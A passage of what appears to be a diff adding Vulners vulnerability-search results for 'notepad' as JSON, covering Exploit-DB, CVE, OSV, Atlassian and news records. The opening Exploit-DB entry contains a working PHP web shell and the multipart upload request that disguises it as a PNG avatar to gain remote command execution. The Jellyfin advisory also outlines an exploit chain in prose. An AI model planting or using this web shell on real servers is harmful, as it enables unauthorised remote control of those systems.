value=\"Execute\"> </form> <pre> <?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?> </pre> </body> </html>\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"utype\"\r\n\r\nuser\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"uimage\"; filename=\"avatar.php\"\r\nContent-Type: image/png\r\n\r\n<html>\r\n<body>\r\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\r\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\r\n<input type=\"SUBMIT\" value=\"Execute\">\r\n</form>\r\n<pre>\r\n<?php\r\n    if(isset($_GET['cmd']))\r\n    {\r\n        system($_GET['cmd']);\r\n    }\r\n?>\r\n</pre>\r\n</body>\r\n</html>\r\n------WebKitFormBoundarypgW90eleiRxRzcEK\r\nContent-Disposition: form-data; name=\"reg\"\r\n\r\nRegister\r\n------WebKitFormBoundarypgW90eleiRxRzcEK--\r\n\r\n-----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## PoC Simple RCE Through This Vulnerability :  ##\r\n\r\nDirectory of C:\\xampp\\htdocs\\realestate\\admin\\user \r\n          ..\r\n02/11/2024  08:09 PM               315 avatar.php\r\n02/11/2024  08:04 PM               315 avatar.png\r\n02/11/2024  06:54 PM             9,376 avatarm2-min.jpg\r\n02/11/2024  06:54 PM            13,186 avatarm7-min.jpg\r\n02/11/2024  07:47 PM             1,814 avatars.php\r\n02/11/2024  06:54 PM             1,313 gr7.png\r\n02/11/2024  07:36 PM                28 poc.php\r\n\r\n-----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## Video PoC : ##\r\n\r\n1- https://github.com/vulnerablecms/RCE-RealEstateVIDEOPOC/blob/main/PoC-RCE.mp4\r\n2- https://gofile.io/d/AEWEgI\r\n-----------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\nGreetz !",
+                    "sourceHref": "https://www.exploit-db.com/raw/51840",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/exploitdb/EDB-ID:51840"
+                },
+                "highlight": {
+                    "sourceData": [
+                        "Intercept By Clicking at Intercept is off .\r\n2- Open The Browser From Proxy Tab Then Open The Resgister Web Page : http://localhost:8080/realestate/register.php\r\n3- Prepare Your RCE PHP Script Base From <span class=\"vulners-highlight\">Notepad</span>"
+                    ]
+                },
+                "sort": [
+                    15.640546,
+                    1709424000000
+                ],
+                "flatDescription": "# Exploit Title: Real Estate Management System v1.0 - Remote Code Execution via File Upload Date: 2/11/2024 Exploit Author: Diyar Saadi Vendor Homepage: https://codeastro.com Version: V1.0 Tested on: Windows 11 +  XAMPP 8.0.30 + Burp Suite Professional v2023.12.1.3 Description ## This..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "CONFSERVER-93629",
+                "_score": 14.754886,
+                "_source": {
+                    "lastseen": "2024-03-01T03:39:51",
+                    "description": "h3. Issue Summary\r\nThe attachment download link still works even after deleting the attachment from the page. \r\n\r\nh3. Steps to Reproduce\r\n # Create a Page and add any attachments to the page\r\n # Click on the attachment and download the attachment using the download button\r\n # Now, right-click on the download button to copy the download link  ( screenshot attached ) \r\n# Save this link in a notepad \r\n# Now, go to the page and delete the attachment from the page \r\n# Clear Confluence Cache too \r\n# On the same browser, open a new tab and paste the download link, it's observed that the attachment still gets downloaded \r\n# It's been observed that the attachment has to be downloaded for the first time and then only the copied link keeps downloading the attachments even after deleting the attachment. \r\n# Also the link only works on the same browser session and not on any new browser or even on a new tab of the same browser\r\n#  The link also works even after the user logs out from Confluence \r\n\r\nh3. Expected Results\r\n* The attachment should not get downloaded if the attachments are deleted from the page using old download attachment links \r\nh3. Actual Results\r\n* The attachment gets downloaded if the attachments are deleted from the page using old download attachment links \r\n\r\nh3. Workaround\r\n\r\n Currently, there is no known workaround for this behavior. A workaround will be added here when available",
+                    "cvss3": {},
+                    "published": "2023-12-12T09:48:56",
+                    "type": "atlassian",
+                    "title": "Attachments download link still works even after deleting attachment from page",
+                    "bulletinFamily": "software",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-01T02:02:16",
+                    "id": "CONFSERVER-93629",
+                    "href": "https://jira.atlassian.com/browse/CONFSERVER-93629",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/atlassian/CONFSERVER-93629"
+                },
+                "highlight": {
+                    "description": [
+                        "# Click on the attachment and download the attachment using the download button\r\n # Now, right-click on the download button to copy the download link  ( screenshot attached ) \r\n# Save this link in a <span class=\"vulners-highlight\">notepad</span>"
+                    ]
+                },
+                "sort": [
+                    14.754886,
+                    1702374536000
+                ],
+                "flatDescription": "h3. Issue Summary The attachment download link still works even after deleting the attachment from the page.  h3. Steps to Reproduce  # Create a Page and add any attachments to the page  # Click on the attachment and download the attachment using the download button  # Now, right-click on the..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "OSV:CVE-2023-47452",
+                "_score": 13.709913,
+                "_source": {
+                    "lastseen": "2024-03-07T09:05:54",
+                    "description": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T21:15:08",
+                    "type": "osv",
+                    "title": "CVE-2023-47452",
+                    "bulletinFamily": "software",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-47452"
+                    ],
+                    "modified": "2023-12-19T21:08:37",
+                    "id": "OSV:CVE-2023-47452",
+                    "href": "https://osv.dev/vulnerability/CVE-2023-47452",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "vhref": "https://vulners.com/osv/OSV:CVE-2023-47452"
+                },
+                "highlight": {
+                    "description": [
+                        "An Untrusted search path vulnerability in <span class=\"vulners-highlight\">notepad</span>++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus"
+                    ]
+                },
+                "sort": [
+                    13.709913,
+                    1701378908000
+                ],
+                "flatDescription": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "OSV:GHSA-9P5F-5X8V-X65M",
+                "_score": 7.364366,
+                "_source": {
+                    "lastseen": "2024-03-11T06:51:31",
+                    "description": "### Impact\nFrederic Linn (@FredericLinn) has reported a series of vulnerabilities that can result in directory traversal, file write, and potential remote code execution on Jellyfin instances. The general process involves chaining several exploits including a stored XSS vulnerability and can be used by an unprivileged user.\n\nThe general process is (using the example of setting an intro video as the payload):\n\n* Create a session as a low-priviledged user with a crafted authorization header\n* Upload an executable that contains a malicious plugin inline via /ClientLog/Document\n* (Admin hovers over our device in dashboard -> XSS payload gets triggered)\n* XSS Payload tries to set encoder path to our uploaded \"log\" file via /System/MediaEncoder/Path\n* The request fails, but in the process our executable actually runs (I guess for verifying if the path points to a valid ffmpeg version)\n* The executable will create a plugin folder and place the inlined plugin DLL inside it\n* The XSS payload shuts down the server via /System/Shutdown (separate CVE in `jellyfin-web`)\n* After (manually) starting the server, the plugin gets loaded and will:\n    * write a new video into the Jellyfin temp folder and register it\n    * register this video as the new intro\n    * and finally provide a malicious endpoint that simply executes system commands and sends back the results\n\nThe ability to write arbitrary content to log files was added in #5918 to allow flexibility to client logging.\n\nThe following two sections detail Frederic's exact determinations regarding the two vulnerabilities.\n\n#### Directory traversal and file write\n\nI've been reading the codebase here and there for a couple of days and found a directory traversal inside the ClientLogController, specifically /ClientLog/Document.\n\nThe GetRequestInformation method retrieves the name and version of the client from the HttpContext.User object.\n\nThose values are attacker controlled when authenticating against the API. Both values are interpolated into a string, which ultimately ends up as an argument to Path.Combine().\n\nSetting a client name to the relative path \"\\..\\..\\..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test\" will write a file with completely attacker controlled content to the executing user's autostart directory.\n\nHowever, because the attacker only partially controls the filename, exploitation proves to be tricky. That's because the resulting file will always end in \".log\", which means putting something in the autostart directory is only going to open notepad on startup. I mean, we can at least insult the user :^).\n\nAnyway, the next logical step would be to write into Jellyfin's plugins directory, but the sub-directories there (of which the already existing configurations directory conveniently counts as one!) are only getting scanned for \".dll\" files.\n\nThis stops an attacker from providing malicious DLLs that implement the correct interfaces in order to be recognized as legitimate plugins.\n\nOn Linux, there might be more options. Running as the standard root user inside a container, an attacker could of course write anywhere. There's the very interesting \"/etc/cron.d\" directory, where an attacker can place cron jobs that get picked up automatically. Those files, however, can't contain a dot. Moreover, inside the container the cronjobs are probably not being executed, as the Jellyfin process should be only one running.\n\nFor the stored XSS component, see https://github.com/jellyfin/jellyfin-web/security/advisories/GHSA-89hp-h43h-r5pq\n\n### Patches\n10.8.10\n\n### Workarounds\nN/A\n\n### References\n\nA complete write-up is available here: https://gebir.ge/blog/peanut-butter-jellyfin-time/",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "NETWORK",
+                            "availabilityImpact": "NONE",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 8.1,
+                            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-04-24T22:39:03",
+                    "type": "osv",
+                    "title": "Directory traversal + file write causing arbitrary code execution",
+                    "bulletinFamily": "software",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 8.0,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "NONE",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 5.5,
+                            "vectorString": "AV:N/AC:L/Au:S/C:P/I:P/A:N",
+                            "version": "2.0",
+                            "accessVector": "NETWORK",
+                            "authentication": "SINGLE"
+                        },
+                        "impactScore": 4.9,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-30626",
+                        "CVE-2023-30627"
+                    ],
+                    "modified": "2024-02-16T08:20:51",
+                    "id": "OSV:GHSA-9P5F-5X8V-X65M",
+                    "href": "https://osv.dev/vulnerability/GHSA-9p5f-5x8v-x65m",
+                    "cvss": {
+                        "score": 5.5,
+                        "vector": "AV:N/AC:L/Au:S/C:P/I:P/A:N"
+                    },
+                    "vhref": "https://vulners.com/osv/OSV:GHSA-9P5F-5X8V-X65M"
+                },
+                "highlight": {
+                    "description": [
+                        "That's because the resulting file will always end in \".log\", which means putting something in the autostart directory is only going to open <span class=\"vulners-highlight\">notepad</span> on startup."
+                    ]
+                },
+                "sort": [
+                    7.364366,
+                    1682375943000
+                ],
+                "flatDescription": "Impact Frederic Linn (@FredericLinn) has reported a series of vulnerabilities that can result in directory traversal, file write, and potential remote code execution on Jellyfin instances. The general process involves chaining several exploits including a stored XSS vulnerability and can be used..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "70407390-C149-54F1-89B0-7611FB420601",
+                "_score": 6.8216295,
+                "_source": {
+                    "lastseen": "2024-03-15T20:39:28",
+                    "description": "# Deathnote\n<p align=\"center\">\n \n<img src=\"https://media3.giphy....",
+                    "cvss3": {
+                        "exploitabilityScore": 1.8,
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "NONE",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "REQUIRED"
+                        },
+                        "impactScore": 5.9
+                    },
+                    "published": "2022-06-08T10:58:23",
+                    "type": "githubexploit",
+                    "title": "Exploit for Externally Controlled Reference to a Resource in Another Sphere in Microsoft",
+                    "bulletinFamily": "exploit",
+                    "cvss2": {
+                        "severity": "HIGH",
+                        "exploitabilityScore": 8.6,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": true,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "MEDIUM",
+                            "confidentialityImpact": "COMPLETE",
+                            "availabilityImpact": "COMPLETE",
+                            "integrityImpact": "COMPLETE",
+                            "baseScore": 9.3,
+                            "vectorString": "AV:N/AC:M/Au:N/C:C/I:C/A:C",
+                            "version": "2.0",
+                            "accessVector": "NETWORK",
+                            "authentication": "NONE"
+                        },
+                        "impactScore": 10.0,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2022-30190"
+                    ],
+                    "modified": "2024-01-16T12:46:20",
+                    "id": "70407390-C149-54F1-89B0-7611FB420601",
+                    "href": "",
+                    "cvss": {
+                        "score": 9.3,
+                        "vector": "AV:N/AC:M/Au:N/C:C/I:C/A:C"
+                    },
+                    "privateArea": 1,
+                    "vhref": "https://vulners.com/githubexploit/70407390-C149-54F1-89B0-7611FB420601"
+                },
+                "highlight": {},
+                "sort": [
+                    6.8216295,
+                    1654685903000
+                ],
+                "flatDescription": "Deathnote..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "THN:922164E5FBAA88CA110AB63E77D13857",
+                "_score": 6.631756,
+                "_source": {
+                    "lastseen": "2024-03-15T06:57:01",
+                    "description": "[![Notepad++ and VNote Installers](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgDTD2qgAAAAASUVORK5CYII=)](<https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiMDfs339flChbFGf3_fpTM5QE9t_zbZHVk4B14sEQPLhc9Z8wcsnsg5Szl-P9GiFWrz-Il1bpVLCyJwcPJL6LqyAe1iC5e394glG98jegZ_OvlUovswO-erglRNLjU0uvquBu1RG-dA-RuaEPJSBGcUp7I9Q-G3xktyEemW7kAqb1lvyw5HvCbCTu_SOo/s728-rw-e365/notepad.jpg>)\n\nChinese users looking for legitimate software such as Notepad++ and VNote on search engines like Baidu are being targeted with malicious ads and bogus links to distribute trojanized versions of the software and ultimately deploy [Geacon](<https://thehackernews.com/2023/05/hackers-using-golang-variant-of-cobalt.html>), a Golang-based implementation of Cobalt Strike.\n\n\"The malicious site found in the notepad++ search is distributed through an advertisement block,\" Kaspersky researcher Sergey Puzan [said](<https://securelist.com/trojanized-text-editor-apps/112167/>).\n\n\"Opening it, an attentive user will immediately notice an amusing inconsistency: the website address contains the line vnote, the title offers a download of Notepad\u2010\u2010 (an analog of Notepad++, also distributed as open-source software), while the image proudly shows Notepad++. In fact, the packages downloaded from here contain Notepad\u2010\u2010.\"\n\n[![Cybersecurity](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgDTD2qgAAAAASUVORK5CYII=)](<https://thehackernews.uk/boundaries728> \"Cybersecurity\" )\n\nThe website, named vnote.fuwenkeji[.]cn, contains download links to Windows, Linux, and macOS versions of the software, with the link to the Windows variant pointing to the official [Gitee repository](<https://gitee.com/cxasm/notepad--/releases/>) containing the Notepad-- installer (\"Notepad--v2.10.0-plugin-Installer.exe\").\n\nThe Linux and macOS versions, on the other hand, lead to malicious installation packages hosted on vnote-1321786806.cos.ap-hongkong.myqcloud[.]com.\n\n[![Notepad++ and VNote Installers](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgDTD2qgAAAAASUVORK5CYII=)](<https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3YL9jZK7dcH5jib8hlhMY1xORRnUyVlmNPonZS_kkY7JlxrIpLTmPlwZh7FvPUkLJxPQ4z5_4VdkPJVrhKpuDRySlZf43o03ZT_NuV0MVd-puk_U1K6YsddJLxgjDBN87Zc0cekaCuH2SNdZhqoJturGoR4-d2kl5OLKroc99QBzBiRFLlQE_HglMJdvo/s728-rw-e365/vnote.jpg>)\n\nIn a similar fashion, the fake look-alike websites for VNote (\"vnote[.]info\" and \"vnotepad[.]com\") lead to the same set of myqcloud[.]com links, in this case, also pointing to a Windows installer hosted on the domain. That said, the links to the potentially malicious versions of VNote are no longer active.\n\nAn analysis of the modified Notepad-- installers reveals that they are designed to retrieve a next-stage payload from a remote server, a backdoor that exhibits similarities with Geacon.\n\n[![Cybersecurity](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgDTD2qgAAAAASUVORK5CYII=)](<https://thehackernews.uk/cis-hardened-images-platforms> \"Cybersecurity\" )\n\nIt's capable of creating SSH connections, performing file operations, enumerating processes, accessing clipboard content, executing files, uploading and downloading files, taking screenshots, and even entering into sleep mode. Command-and-control (C2) is facilitated by means of HTTPS protocol.\n\nThe development comes as malvertising campaigns have also [acted](<https://www.broadcom.com/support/security-center/protection-bulletin/fakebat-malware-spread-via-malvertising>) as a conduit for other malware such as [FakeBat](<https://thehackernews.com/2024/01/atomic-stealer-gets-upgrade-targeting.html>) (aka EugenLoader) malware with the help of MSIX installer files masquerading as Microsoft OneNote, Notion, and Trello.\n\n  \n\n\nFound this article interesting? Follow us on [Twitter _\uf099_](<https://twitter.com/thehackersnews>) and [LinkedIn](<https://www.linkedin.com/company/thehackernews/>) to read more exclusive content we post.\n",
+                    "cvss3": {},
+                    "published": "2024-03-15T06:18:00",
+                    "type": "thn",
+                    "title": "Malicious Ads Targeting Chinese Users with Fake Notepad++ and VNote Installers",
+                    "bulletinFamily": "info",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-15T06:18:54",
+                    "id": "THN:922164E5FBAA88CA110AB63E77D13857",
+                    "href": "https://thehackernews.com/2024/03/malicious-ads-targeting-chinese-users.html",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/thn/THN:922164E5FBAA88CA110AB63E77D13857"
+                },
+                "highlight": {
+                    "description": [
+                        "[<span class=\"vulners-highlight\">Notepad</span>++ and VNote Installers](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgDTD2qgAAAAASUVORK5CYII=)](<https://blogger.googleusercontent.com/img/b/R29vZ2xl",
+                        "\"Opening it, an attentive user will immediately notice an amusing inconsistency: the website address contains the line vnote, the title offers a download of <span class=\"vulners-highlight\">Notepad</span>\u2010\u2010 (an analog of <span class=\"vulners-highlight\">Notepad</span>++, also distributed",
+                        "as open-source software), while the image proudly shows <span class=\"vulners-highlight\">Notepad</span>++.",
+                        "In fact, the packages downloaded from here contain <span class=\"vulners-highlight\">Notepad</span>\u2010\u2010.\"\n\n[!",
+                        "--/releases/>) containing the <span class=\"vulners-highlight\">Notepad</span>-- installer (\"<span class=\"vulners-highlight\">Notepad</span>--v2.10.0-plugin-Installer.exe\")."
+                    ],
+                    "title": [
+                        "Malicious Ads Targeting Chinese Users with Fake <span class=\"vulners-highlight\">Notepad</span>++ and VNote Installers"
+                    ]
+                },
+                "sort": [
+                    6.631756,
+                    1710483480000
+                ],
+                "flatDescription": "Chinese users looking for legitimate software such as Notepad++ and VNote on search engines like Baidu are being targeted with malicious ads and bogus links to distribute trojanized versions of the software and ultimately deploy Geacon, a Golang-based implementation of Cobalt Strike. &quot;The..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "CVE-2023-47452",
+                "_score": 5.9904113,
+                "_source": {
+                    "lastseen": "2024-03-06T13:38:10",
+                    "description": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T21:15:08",
+                    "type": "cve",
+                    "title": "CVE-2023-47452",
+                    "cwe": [
+                        "CWE-427"
+                    ],
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-47452"
+                    ],
+                    "modified": "2023-12-06T17:02:02",
+                    "cpe": [
+                        "cpe:/a:notepad-plus-plus:notepad\\+\\+:6.5"
+                    ],
+                    "id": "CVE-2023-47452",
+                    "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-47452",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "cpe23": [
+                        "cpe:2.3:a:notepad-plus-plus:notepad\\+\\+:6.5:*:*:*:*:*:*:*"
+                    ],
+                    "vhref": "https://vulners.com/cve/CVE-2023-47452"
+                },
+                "highlight": {
+                    "product_info.vendor": [
+                        "<span class=\"vulners-highlight\">Notepad</span>-plus-plus"
+                    ],
+                    "description": [
+                        "An Untrusted search path vulnerability in <span class=\"vulners-highlight\">notepad</span>++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus <span class=\"vulners-highlight\">notepad</span>\\+\\+"
+                    ],
+                    "affectedSoftware.cpeName": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus:notepad\\+\\+"
+                    ],
+                    "product_info.product": [
+                        "<span class=\"vulners-highlight\">Notepad</span>\\+\\+"
+                    ]
+                },
+                "sort": [
+                    5.9904113,
+                    1701378908000
+                ],
+                "flatDescription": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "PRION:CVE-2023-47452",
+                "_score": 5.449599,
+                "_source": {
+                    "lastseen": "2024-03-07T01:00:24",
+                    "description": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T21:15:00",
+                    "type": "prion",
+                    "title": "Design/Logic Flaw",
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-47452"
+                    ],
+                    "modified": "2023-12-06T17:02:00",
+                    "id": "PRION:CVE-2023-47452",
+                    "href": "https://www.prio-n.com/kb/vulnerability/CVE-2023-47452",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "vhref": "https://vulners.com/prion/PRION:CVE-2023-47452"
+                },
+                "highlight": {
+                    "description": [
+                        "An Untrusted search path vulnerability in <span class=\"vulners-highlight\">notepad</span>++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working directory."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>\\\\+\\\\+"
+                    ]
+                },
+                "sort": [
+                    5.449599,
+                    1701378900000
+                ],
+                "flatDescription": "An Untrusted search path vulnerability in notepad++ 6.5 allows local users to gain escalated privileges through the msimg32.dll file in the current working..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "KLA60810",
+                "_score": 4.5528617,
+                "_source": {
+                    "lastseen": "2024-03-11T09:04:32",
+                    "description": "### *Detect date*:\n09/08/2023\n\n### *Severity*:\nHigh\n\n### *Description*:\nMultiple vulnerabilities were found in Notepad++. Malicious users can exploit these vulnerabilities to execute arbitrary code, obtain sensitive information.\n\n### *Exploitation*:\nPublic exploits exist for this vulnerability.\n\n### *Affected products*:\nNotepad++ earlier than 8.5.7\n\n### *Solution*:\nUpdate to the latest version  \n[Download Notepad++](<https://notepad-plus-plus.org/downloads/>)\n\n### *Original advisories*:\n[Notepad++ v8.5.7 bug-fixes and new features:](<https://notepad-plus-plus.org/downloads/v8.5.7/>)  \n\n\n### *Impacts*:\nACE \n\n### *Related products*:\n[Notepad++](<https://threats.kaspersky.com/en/product/Notepad++/>)\n\n### *CVE-IDS*:\n[CVE-2023-40031](<https://vulners.com/cve/CVE-2023-40031>)7.8Critical  \n[CVE-2023-40036](<https://vulners.com/cve/CVE-2023-40036>)5.5High  \n[CVE-2023-40164](<https://vulners.com/cve/CVE-2023-40164>)5.5High  \n[CVE-2023-40166](<https://vulners.com/cve/CVE-2023-40166>)5.5High",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "NONE",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "REQUIRED"
+                        }
+                    },
+                    "published": "2023-09-08T00:00:00",
